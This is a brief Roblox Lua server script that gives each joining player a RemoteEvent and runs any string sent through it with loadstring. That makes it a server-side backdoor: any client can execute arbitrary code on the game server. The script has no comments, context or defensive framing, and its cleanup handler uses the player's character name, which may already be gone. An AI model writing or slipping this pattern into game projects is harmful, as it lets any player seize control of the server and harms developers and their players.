game.Players.PlayerAdded:Connect(function(plr)
	local server = Instance.new("RemoteEvent",game.ReplicatedStorage)
	server.Name = plr.Name
	server.OnServerEvent:connect(function(player,SS)
		loadstring(SS)()
	end)
end)

game.Players.PlayerRemoving:Connect(function(plr)
	game.ReplicatedStorage:WaitForChild(plr.Character.Name):Destroy()
end)
